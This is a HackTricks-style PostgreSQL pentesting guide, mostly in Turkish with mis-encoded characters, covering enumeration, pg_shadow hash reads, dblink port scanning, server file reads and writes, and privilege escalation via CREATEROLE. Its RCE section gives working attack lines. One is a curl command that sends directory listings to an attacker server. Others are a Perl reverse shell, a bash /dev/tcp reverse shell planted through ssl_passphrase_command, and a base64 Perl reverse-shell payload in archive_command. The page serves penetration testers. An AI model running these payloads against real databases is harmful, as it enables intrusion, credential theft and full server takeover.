# 5432,5433 - Postgresql Pentesting

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dÃ¼nyanÄ±n en geliÅŸmiÅŸ topluluk araÃ§larÄ± tarafÄ±ndan desteklenen iÅŸ akÄ±ÅŸlarÄ±nÄ± kolayca oluÅŸturabilir ve otomatikleÅŸtirebilirsiniz.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklam vermek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARINA**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

## **Temel Bilgiler**

**PostgreSQL**, SQL dilini kullanmanÄ±n yanÄ± sÄ±ra ek Ã¶zelliklerle geliÅŸtirilen ve **aÃ§Ä±k kaynaklÄ±** bir **nesne iliÅŸkisel veritabanÄ± sistemi** olarak tanÄ±mlanÄ±r. Yetenekleri, Ã§eÅŸitli veri tiplerini ve iÅŸlemleri ele alabilmesini saÄŸlar, bu da geliÅŸtiriciler ve kuruluÅŸlar iÃ§in Ã§ok yÃ¶nlÃ¼ bir seÃ§enek yapar.

**VarsayÄ±lan port:** 5432 ve bu port zaten kullanÄ±lÄ±yorsa, postgresql muhtemelen kullanÄ±lmayan bir sonraki portu (muhtemelen 5433) kullanacaktÄ±r.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## BaÄŸlanma ve Temel Enum

PostgreSQL veritabanÄ± sunucusuna baÄŸlanmak iÃ§in Ã§eÅŸitli yÃ¶ntemler vardÄ±r. Ä°lk olarak, `psql` komutunu kullanarak terminal Ã¼zerinden baÄŸlanabilirsiniz:

```bash
psql -h <hedef_IP> -p <hedef_port> -U <kullanÄ±cÄ±_adÄ±> -d <veritabanÄ±_adÄ±>
```

Alternatif olarak, Python `psycopg2` modÃ¼lÃ¼nÃ¼ kullanarak da baÄŸlantÄ± yapabilirsiniz:

```python
import psycopg2

conn = psycopg2.connect(
    host="<hedef_IP>",
    port=<hedef_port>,
    user="<kullanÄ±cÄ±_adÄ±>",
    password="<ÅŸifre>",
    database="<veritabanÄ±_adÄ±>"
)
```

BaÄŸlandÄ±ktan sonra, aÅŸaÄŸÄ±daki komutlarÄ± kullanarak temel enum iÅŸlemlerini gerÃ§ekleÅŸtirebilirsiniz:

- `SELECT version();`: PostgreSQL sunucusunun sÃ¼rÃ¼mÃ¼nÃ¼ alÄ±r.
- `SELECT current_user;`: Mevcut kullanÄ±cÄ±yÄ± alÄ±r.
- `SELECT current_database();`: Mevcut veritabanÄ±nÄ± alÄ±r.
- `SELECT * FROM pg_user;`: TÃ¼m kullanÄ±cÄ±larÄ± listeler.
- `SELECT * FROM pg_shadow;`: TÃ¼m kullanÄ±cÄ± ÅŸifrelerini listeler.
- `SELECT * FROM pg_roles;`: TÃ¼m rolleri listeler.
- `SELECT * FROM pg_group;`: TÃ¼m gruplarÄ± listeler.
- `SELECT * FROM pg_stat_activity;`: Mevcut etkin baÄŸlantÄ±larÄ± listeler.

Bu komutlar, PostgreSQL sunucusu hakkÄ±nda temel bilgileri elde etmenize yardÄ±mcÄ± olacaktÄ±r.
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
**`\list`** komutunu Ã§alÄ±ÅŸtÄ±rarak **`rdsadmin`** adÄ±nda bir veritabanÄ± bulursanÄ±z, bir **AWS PostgreSQL veritabanÄ±** iÃ§inde olduÄŸunuzu bilirsiniz.
{% endhint %}

Daha fazla bilgi iÃ§in **PostgreSQL veritabanÄ±nÄ± kÃ¶tÃ¼ye kullanma** hakkÄ±nda kontrol edin:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## Otomatik NumaralandÄ±rma
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **Port taramasÄ±**

[**Bu araÅŸtÄ±rmaya**](https://www.exploit-db.com/papers/13084) gÃ¶re, bir baÄŸlantÄ± denemesi baÅŸarÄ±sÄ±z olduÄŸunda, `dblink` bir hata aÃ§Ä±klamasÄ± iÃ§eren `sqlclient_unable_to_establish_sqlconnection` istisnasÄ± fÄ±rlatÄ±r. Bu ayrÄ±ntÄ±larÄ±n Ã¶rnekleri aÅŸaÄŸÄ±da listelenmiÅŸtir.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* Host kapalÄ±

`DETAY: Sunucuya baÄŸlanÄ±lamadÄ±: Hedefe yÃ¶nlendirme yok. Sunucu "1.2.3.4" Ã¼zerinde Ã§alÄ±ÅŸÄ±yor mu ve TCP/IP baÄŸlantÄ±larÄ± iÃ§in 5678 numaralÄ± portu kabul ediyor mu?`

* Port kapalÄ±
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* Port aÃ§Ä±k
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
veya
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* Port aÃ§Ä±k veya filtrelenmiÅŸ
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
PL/pgSQL fonksiyonlarÄ±nda, ÅŸu anda istisna ayrÄ±ntÄ±larÄ±nÄ± elde etmek mÃ¼mkÃ¼n deÄŸildir. Bununla birlikte, PostgreSQL sunucusuna doÄŸrudan eriÅŸiminiz varsa, gerekli bilgileri alabilirsiniz. Sistem tablolarÄ±ndan kullanÄ±cÄ± adlarÄ±nÄ± ve parolalarÄ±nÄ± Ã§Ä±karmak mÃ¼mkÃ¼n deÄŸilse, olumlu sonuÃ§lar elde edebilecek olan Ã¶nceki bÃ¶lÃ¼mde tartÄ±ÅŸÄ±lan wordlist saldÄ±rÄ± yÃ¶ntemini kullanmayÄ± dÃ¼ÅŸÃ¼nebilirsiniz.

## Yetkilendirme Saptama

### Roller

| Rol TÃ¼rleri    |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Rol sÃ¼per kullanÄ±cÄ± yetkilerine sahiptir                                                                                                             |
| rolinherit     | Rol, Ã¼yesi olduÄŸu rollerin yetkilerini otomatik olarak devralÄ±r                                                                                        |
| rolcreaterole  | Rol, daha fazla rol oluÅŸturabilir                                                                                                                    |
| rolcreatedb    | Rol, veritabanlarÄ± oluÅŸturabilir                                                                                                                      |
| rolcanlogin    | Rol oturum aÃ§abilir. Yani, bu rol, baÅŸlangÄ±Ã§ oturum yetkilendirme kimliÄŸi olarak verilebilir                                                         |
| rolreplication | Rol bir replikasyon rolÃ¼dÃ¼r. Bir replikasyon rolÃ¼ replikasyon baÄŸlantÄ±larÄ± baÅŸlatabilir ve replikasyon yuvalarÄ± oluÅŸturabilir ve silebilir.               |
| rolconnlimit   | Oturum aÃ§abilen roller iÃ§in, bu rolÃ¼n yapabileceÄŸi eÅŸzamanlÄ± baÄŸlantÄ±larÄ±n maksimum sayÄ±sÄ±nÄ± ayarlar. -1 sÄ±nÄ±rsÄ±z anlamÄ±na gelir.                       |
| rolpassword    | Parola deÄŸil (her zaman `********` olarak okunur)                                                                                                    |
| rolvaliduntil  | Parola sÃ¼resi dolma zamanÄ± (yalnÄ±zca parola kimlik doÄŸrulamasÄ± iÃ§in kullanÄ±lÄ±r); sÃ¼resi dolmazsa null                                                   |
| rolbypassrls   | Rol, her satÄ±r dÃ¼zeyi gÃ¼venlik politikasÄ±nÄ± atlar, daha fazla bilgi iÃ§in [BÃ¶lÃ¼m 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html)'e bakÄ±n. |
| rolconfig      | Ã‡alÄ±ÅŸma zamanÄ± yapÄ±landÄ±rma deÄŸiÅŸkenleri iÃ§in rol Ã¶zel varsayÄ±lanlar                                                                                  |
| oid            | RolÃ¼n kimliÄŸi                                                                                                                                       |

#### Ä°lginÃ§ Gruplar

* **`pg_execute_server_program`** Ã¼yesiyseniz, programlarÄ± **Ã§alÄ±ÅŸtÄ±rabilirsiniz**
* **`pg_read_server_files`** Ã¼yesiyseniz, dosyalarÄ± **okuyabilirsiniz**
* **`pg_write_server_files`** Ã¼yesiyseniz, dosyalara **yazabilirsiniz**

{% hint style="info" %}
Postgres'te bir **kullanÄ±cÄ±**, bir **grup** ve bir **rol** aynÄ±dÄ±r. Sadece **nasÄ±l kullandÄ±ÄŸÄ±nÄ±za** ve **oturum aÃ§masÄ±na izin verip vermediÄŸinize** baÄŸlÄ±dÄ±r.
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tablolar

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema='public';
```

Bu sorgu, PostgreSQL veritabanÄ±nda bulunan tÃ¼m tablolarÄ±n isimlerini dÃ¶ndÃ¼rÃ¼r.
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Fonksiyonlar

Functions in PostgreSQL are named blocks of code that can be executed by calling their name. They are used to perform specific tasks and can accept parameters and return values. In PostgreSQL, functions are created using the `CREATE FUNCTION` statement.

PostgreSQL'de fonksiyonlar, adlarÄ±nÄ± Ã§aÄŸÄ±rarak Ã§alÄ±ÅŸtÄ±rÄ±labilen adlandÄ±rÄ±lmÄ±ÅŸ kod bloklarÄ±dÄ±r. Belirli gÃ¶revleri gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±lÄ±rlar ve parametreleri kabul edebilir ve deÄŸer dÃ¶ndÃ¼rebilirler. PostgreSQL'de fonksiyonlar, `CREATE FUNCTION` ifadesi kullanÄ±larak oluÅŸturulur.

The basic syntax for creating a function in PostgreSQL is as follows:

PostgreSQL'de bir fonksiyon oluÅŸturmak iÃ§in temel sÃ¶zdizimi aÅŸaÄŸÄ±daki gibidir:

```sql
CREATE FUNCTION function_name ([parameter1 data_type [, parameter2 data_type, ...]])
  RETURNS return_data_type
  LANGUAGE language_name
AS $$
  -- Function body
$$;
```

- `function_name` is the name of the function.
- `parameter1`, `parameter2`, etc. are the input parameters of the function, along with their data types.
- `return_data_type` is the data type of the value returned by the function.
- `language_name` is the programming language used to write the function code.
- `-- Function body` is the code that defines the logic of the function.

- `function_name`, fonksiyonun adÄ±dÄ±r.
- `parameter1`, `parameter2`, vb., fonksiyonun giriÅŸ parametreleridir ve veri tipleriyle birlikte belirtilir.
- `return_data_type`, fonksiyon tarafÄ±ndan dÃ¶ndÃ¼rÃ¼len deÄŸerin veri tipidir.
- `language_name`, fonksiyon kodunu yazmak iÃ§in kullanÄ±lan programlama dilidir.
- `-- Fonksiyon gÃ¶vdesi`, fonksiyonun mantÄ±ÄŸÄ±nÄ± tanÄ±mlayan kod parÃ§acÄ±ÄŸÄ±dÄ±r.

Here's an example of a simple function that calculates the sum of two numbers:

Ä°ÅŸte iki sayÄ±nÄ±n toplamÄ±nÄ± hesaplayan basit bir fonksiyon Ã¶rneÄŸi:

```sql
CREATE FUNCTION sum_numbers(a integer, b integer)
  RETURNS integer
  LANGUAGE plpgsql
AS $$
BEGIN
  RETURN a + b;
END;
$$;
```

In this example, the function is named `sum_numbers` and accepts two input parameters of type `integer`. It returns a value of type `integer`. The function body consists of a single statement that adds the two input parameters and returns the result.

Bu Ã¶rnekte, fonksiyon `sum_numbers` olarak adlandÄ±rÄ±lmÄ±ÅŸ ve `integer` tÃ¼rÃ¼nde iki giriÅŸ parametresi kabul eder. `integer` tÃ¼rÃ¼nde bir deÄŸer dÃ¶ndÃ¼rÃ¼r. Fonksiyon gÃ¶vdesi, iki giriÅŸ parametresini ekleyen ve sonucu dÃ¶ndÃ¼ren tek bir ifadeden oluÅŸur.
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Dosya sistemi iÅŸlemleri

### Dizinleri ve dosyalarÄ± okuma

Bu [**commit**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) ile tanÄ±mlanan **`DEFAULT_ROLE_READ_SERVER_FILES`** grubunun Ã¼yeleri (yani **`pg_read_server_files`**) ve **sÃ¼per kullanÄ±cÄ±lar**, herhangi bir yol Ã¼zerinde **`COPY`** yÃ¶ntemini kullanabilir (bkz. `genfile.c` iÃ§indeki `convert_and_check_filename`).
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
UnutmayÄ±n, sÃ¼per kullanÄ±cÄ± deÄŸilseniz ancak **CREATEROLE** izinlerine sahipseniz, **kendinizi o gruba Ã¼ye yapabilirsiniz:**
```sql
GRANT pg_read_server_files TO username;
```
[**Daha fazla bilgi.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

**Dosya okuma veya dizin listeleme** iÅŸlemleri iÃ§in kullanÄ±labilecek **diÄŸer postgres fonksiyonlarÄ±** bulunmaktadÄ±r. BunlarÄ± yalnÄ±zca **sÃ¼per kullanÄ±cÄ±lar** ve **aÃ§Ä±k izinlere sahip kullanÄ±cÄ±lar** kullanabilir:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Daha fazla iÅŸlevi [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html) adresinde bulabilirsiniz.

### Basit Dosya Yazma

Sadece **sÃ¼per kullanÄ±cÄ±lar** ve **`pg_write_server_files`** Ã¼yeleri, dosya yazmak iÃ§in kopyalamayÄ± kullanabilir.

{% code overflow="wrap" %}
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
UnutmayÄ±n, sÃ¼per kullanÄ±cÄ± deÄŸilseniz ancak **`CREATEROLE`** izinlerine sahipseniz, **kendinizi o gruba Ã¼ye yapabilirsiniz:**
```sql
GRANT pg_write_server_files TO username;
```
[**Daha fazla bilgi.**](pentesting-postgresql.md#createrole-ile-ayrÄ±calÄ±k-yÃ¼kseltme)
{% endhint %}

UnutmayÄ±n ki COPY, yeni satÄ±r karakterlerini iÅŸleyemez, bu yÃ¼zden bir base64 yÃ¼kÃ¼ kullanÄ±yor olsanÄ±z bile **tek satÄ±rlÄ±k bir komut gÃ¶ndermeniz gerekmektedir**.\
Bu teknikin Ã§ok Ã¶nemli bir kÄ±sÄ±tlamasÄ± vardÄ±r, **`copy` binary dosyalarÄ± yazmak iÃ§in kullanÄ±lamaz Ã§Ã¼nkÃ¼ bazÄ± binary deÄŸerleri deÄŸiÅŸtirir**.

### **Binary dosyalarÄ±n yÃ¼klenmesi**

Ancak, **bÃ¼yÃ¼k binary dosyalarÄ± yÃ¼klemek iÃ§in baÅŸka teknikler de vardÄ±r:**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**Bug bounty ipucu**: **Intigriti'ye kaydolun**, hackerlar tarafÄ±ndan oluÅŸturulan bir premium **bug bounty platformuna**! BugÃ¼n [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) adresinde bize katÄ±lÄ±n ve **$100,000**'e kadar Ã¶dÃ¼ller kazanmaya baÅŸlayÄ±n!

{% embed url="https://go.intigriti.com/hacktricks" %}

## RCE

### **Programa RCE**

[9.3 sÃ¼rÃ¼mÃ¼nden](https://www.postgresql.org/docs/9.3/release-9-3.html) itibaren, sadece **sÃ¼per kullanÄ±cÄ±lar** ve **`pg_execute_server_program`** grubunun Ã¼yeleri, RCE iÃ§in copy komutunu kullanabilir (Ã¶rnek ile veri Ã§alma:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Ã–rnek Ã§alÄ±ÅŸtÄ±rmak iÃ§in:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
UnutmayÄ±n, sÃ¼per kullanÄ±cÄ± deÄŸilseniz ancak **`CREATEROLE`** izinlerine sahipseniz, **kendinizi o gruba Ã¼ye yapabilirsiniz:**
```sql
GRANT pg_execute_server_program TO username;
```
[**Daha fazla bilgi.**](pentesting-postgresql.md#createrole-ile-ayrÄ±calÄ±k-yÃ¼kseltme)
{% endhint %}

Veya **metasploit**'in `multi/postgres/postgres_copy_from_program_cmd_exec` modÃ¼lÃ¼nÃ¼ kullanÄ±n. Bu zafiyet hakkÄ±nda daha fazla bilgi [**burada**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5) bulunabilir. CVE-2019-9193 olarak bildirilmesine raÄŸmen, Postges bunun bir [Ã¶zellik olduÄŸunu ve dÃ¼zeltilemeyeceÄŸini](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/) aÃ§Ä±kladÄ±.

### PostgreSQL Dilleri ile RCE

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### PostgreSQL uzantÄ±larÄ± ile RCE

Ã–nceki yazÄ±dan **nasÄ±l ikili dosyalar yÃ¼kleneceÄŸini Ã¶ÄŸrendikten** sonra, bir postgresql uzantÄ±sÄ± yÃ¼kleyerek **RCE elde etmeyi** deneyebilirsiniz.

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### PostgreSQL yapÄ±landÄ±rma dosyasÄ± RCE

Postgresql'in **yapÄ±landÄ±rma dosyasÄ±**, veritabanÄ±nÄ± Ã§alÄ±ÅŸtÄ±ran **postgres kullanÄ±cÄ±sÄ±** tarafÄ±ndan **yazÄ±labilir** olduÄŸundan, **sÃ¼per kullanÄ±cÄ±** olarak dosyalarÄ± dosya sistemine yazabilir ve bu nedenle bu dosyayÄ± **Ã¼zerine yazabilirsiniz**.

![](<../.gitbook/assets/image (303).png>)

#### **ssl\_passphrase\_command** ile RCE

Bu teknik hakkÄ±nda daha fazla bilgi [burada](https://pulsesecurity.co.nz/articles/postgres-sqli) bulunabilir.

YapÄ±landÄ±rma dosyasÄ±nda RCE'ye yol aÃ§abilecek bazÄ± ilginÃ§ Ã¶zellikler bulunur:

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` VeritabanÄ±nÄ±n Ã¶zel anahtarÄ±nÄ±n yolu
* `ssl_passphrase_command = ''` Ã–zel dosya ÅŸifreyle korunuyorsa (ÅŸifrelenmiÅŸse), postgresql bu Ã¶zelliÄŸe belirtilen komutu **yÃ¼rÃ¼tÃ¼r**.
* `ssl_passphrase_command_supports_reload = off` Bu Ã¶zellik **aÃ§Ä±ksa**, anahtar ÅŸifreyle korunuyorsa **komut** `pg_reload_conf()` **Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda** **yÃ¼rÃ¼tÃ¼lÃ¼r**.

Bir saldÄ±rganÄ±n yapmasÄ± gerekenler:

1. Sunucudan **Ã¶zel anahtarÄ±** Ã§Ä±karÄ±n
2. Ä°ndirilen Ã¶zel anahtarÄ± **ÅŸifreleyin**:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. Ãœzerine yazÄ±n
4. Mevcut postgresql **yapÄ±landÄ±rmasÄ±nÄ±** dÃ¶kÃ¼n
5. Bahsedilen Ã¶zellikler yapÄ±landÄ±rmasÄ±yla **yapÄ±landÄ±rmayÄ± Ã¼zerine yazÄ±n**:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. `pg_reload_conf()`'u Ã§alÄ±ÅŸtÄ±rÄ±n

Bu test sÄ±rasÄ±nda, bu iÅŸlemin yalnÄ±zca **Ã¶zel anahtar dosyasÄ±nÄ±n 640 ayrÄ±calÄ±ÄŸÄ±na sahip olmasÄ±**, **root tarafÄ±ndan sahiplenilmesi** ve **ssl-cert veya postgres** grubuna ait olmasÄ± (bu nedenle postgres kullanÄ±cÄ±sÄ± okuyabilir) ve _/var/lib/postgresql/12/main_ dizinine yerleÅŸtirilmesi durumunda Ã§alÄ±ÅŸacaÄŸÄ±nÄ± fark ettim.

#### **archive\_command** ile RCE

Bu yapÄ±landÄ±rma ve WAL hakkÄ±nda daha fazla bilgi [burada](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3) bulunabilir.

YapÄ±landÄ±rma dosyasÄ±ndaki baÅŸka bir sÃ¶zde `archive_command` kullanÄ±labilir Ã¶zelliktir.

Bunun Ã§alÄ±ÅŸmasÄ± iÃ§in `archive_mode` ayarÄ±nÄ±n `'on'` veya `'always'` olmasÄ± gerekmektedir. Bu durum doÄŸruysa, `archive_command` iÃ§indeki komutu Ã¼zerine yazabilir ve WAL (write-ahead logging) iÅŸlemleri aracÄ±lÄ±ÄŸÄ±yla Ã§alÄ±ÅŸmasÄ±nÄ± zorlayabiliriz.

Genel adÄ±mlar ÅŸunlardÄ±r:

1. ArÅŸiv modunun etkin olup olmadÄ±ÄŸÄ±nÄ± kontrol edin: `SELECT current_setting('archive_mode')`
2. `archive_command`'Ä± payload ile Ã¼zerine yazÄ±n. Ã–rneÄŸin, ters kabuk iÃ§in: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. YapÄ±landÄ±rmayÄ± yeniden yÃ¼kleyin: `SELECT pg_reload_conf()`
4. ArÅŸiv iÅŸleminin Ã§alÄ±ÅŸmasÄ±nÄ± zorlayÄ±n, bu da arÅŸiv komutunu Ã§aÄŸÄ±racaktÄ±r: BazÄ± Postgres sÃ¼rÃ¼mleri iÃ§in `SELECT pg_switch_xlog()` veya `SELECT pg_switch_wal()`

## **Postgres AyrÄ±calÄ±k YÃ¼kseltme**

### CREATEROLE AyrÄ±calÄ±k YÃ¼kseltme

#### **Grant**

[**Belgelere**](https://www.postgresql.org/docs/13/sql-grant.html) gÃ¶re: **`CREATEROLE`** ayrÄ±calÄ±ÄŸÄ±na sahip roller, **sÃ¼per kullanÄ±cÄ±** olmayan **herhangi bir role** Ã¼yelik **verebilir veya geri alabilir**.

Bu nedenle, **`CREATEROLE`** iznine sahipseniz, kendinize diÄŸer **roller** (sÃ¼per kullanÄ±cÄ± olmayanlar) iÃ§in eriÅŸim izni verebilirsiniz, bu da size dosya okuma ve yazma yeteneÄŸi ve komut yÃ¼rÃ¼tme seÃ§eneÄŸi verebilir.
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Åifre DeÄŸiÅŸtirme

Bu roldeki kullanÄ±cÄ±lar, diÄŸer **sÃ¼per kullanÄ±cÄ±lar** dÄ±ÅŸÄ±ndaki **kullanÄ±cÄ±larÄ±n ÅŸifrelerini deÄŸiÅŸtirebilirler**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### SUPERUSER'a YÃ¼kseltme

Ã‡ok yaygÄ±n bir durumdur ki **yerel kullanÄ±cÄ±lar herhangi bir ÅŸifre girmeden PostgreSQL'e giriÅŸ yapabilir**. Bu nedenle, **kod Ã§alÄ±ÅŸtÄ±rma izinlerini** elde ettiÄŸinizde bu izinleri kullanarak **`SUPERUSER`** rolÃ¼nÃ¼ elde edebilirsiniz:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
Bu genellikle **`pg_hba.conf`** dosyasÄ±ndaki aÅŸaÄŸÄ±daki satÄ±rlar sayesinde mÃ¼mkÃ¼ndÃ¼r:
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **ALTER TABLE privesc**

